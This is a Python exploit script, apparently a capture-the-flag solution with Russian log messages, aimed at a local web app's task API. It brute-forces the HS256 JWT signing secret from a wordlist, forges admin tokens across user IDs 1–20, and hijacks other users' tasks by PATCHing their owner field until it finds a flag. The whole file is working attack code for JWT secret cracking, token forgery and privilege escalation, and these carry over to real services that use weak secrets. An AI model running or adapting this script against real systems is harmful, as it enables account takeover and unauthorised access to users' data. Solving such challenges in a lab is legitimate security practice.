import time
import uuid

import jwt
import requests
from jwt import InvalidTokenError
from tqdm import tqdm

BASE_URL = "http://localhost:8000"
ALGORITHM = "HS256"
WORDLIST = [
    "123456", "password", "admin", "qwerty", "letmein", "test",
    "secret", "changeme", "admin123", "jwtsecret", "toor", "root"
]

USERNAME = "hacker"
PASSWORD = "hackerpassword"


def register_user():
    url = f"{BASE_URL}/api/register/"
    data = {"username": USERNAME, "password": PASSWORD}
    try:
        r = requests.post(url, json=data)
        if r.status_code in [200, 201]:
            print(f"[+] Зарегистрирован: {USERNAME}")
        elif r.status_code == 400 and "username" in r.json():
            print(f"[*] Пользователь уже существует")
        else:
            print(f"[-] Ошибка регистрации: {r.status_code}")
            exit(1)
    except Exception as e:
        print(f"[-] Ошибка регистрации: {e}")
        exit(1)


def get_token_from_server():
    url = f"{BASE_URL}/api/login/"
    data = {"username": USERNAME, "password": PASSWORD}
    r = requests.post(url, json=data)
    r.raise_for_status()
    return r.json()["access"]


def brute_force_jwt_secret(token):
    print("[*] Начинаю брутфорс JWT-секрета...")
    for secret in tqdm(WORDLIST, desc="Брутфорс"):
        try:
            decoded = jwt.decode(token, secret, algorithms=[ALGORITHM])
            if decoded.get("username") == USERNAME:
                print(f"[+] Найден секрет: {secret}")
                return secret
        except InvalidTokenError:
            continue
    raise Exception("[-] Не удалось подобрать JWT-секрет")


def create_admin_token(secret, admin_user_id):
    now = int(time.time())
    payload = {
        "token_type": "access",
        "exp": now + 300,
        "iat": now,
        "jti": uuid.uuid4().hex,
        "user_id": admin_user_id,
        "role": "admin",
        "username": "admin"
    }
    return jwt.encode(payload, secret, algorithm=ALGORITHM)


def get_tasks(token):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/api/tasks/", headers=headers)
    r.raise_for_status()
    return r.json()


def get_task_by_id(token, task_id):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/api/tasks/{task_id}/", headers=headers)
    r.raise_for_status()
    return r.json()


def hijack_task(token, task_id, admin_user_id):
    headers = {"Authorization": f"Bearer {token}"}
    data = {"user": admin_user_id}
    r = requests.patch(f"{BASE_URL}/api/tasks/{task_id}/", json=data, headers=headers)
    return r.status_code in [200, 204]


def try_find_flag(token, admin_user_id):
    print(f"[*] Перебор задач с user_id = {admin_user_id}...")
    tasks_response = get_tasks(token)
    if not tasks_response or "results" not in tasks_response:
        print("[-] Неверный формат ответа от сервера.")
        return None

    tasks = tasks_response["results"]

    for task in tasks:
        task_id = task["id"]
        try:
            task_data = get_task_by_id(token, task_id)
        except requests.HTTPError:
            success = hijack_task(token, task_id, admin_user_id)
            if success:
                print(f"[+] Успешно захватили задачу {task_id}")
                task_data = get_task_by_id(token, task_id)
            else:
                print(f"[-] Не удалось захватить задачу {task_id}")
                continue

        description = task_data.get("description", "")
        if "HITS{" in description:
            print(f"[+] Флаг найден: {description}")
            return description

    print("[-] Флаг не найден")
    return None


if __name__ == "__main__":
    register_user()
    user_token = get_token_from_server()
    jwt_secret = brute_force_jwt_secret(user_token)

    for admin_id in range(1, 21):
        print(f"[*] Пробую user_id = {admin_id}")
        admin_token = create_admin_token(jwt_secret, admin_id)
        flag = try_find_flag(admin_token, admin_id)
        if flag:
            print(f"[!!!] Флаг успешно получен: {flag}")
            break
    else:
        print("[-] Не удалось найти флаг ни с одним из user_id.")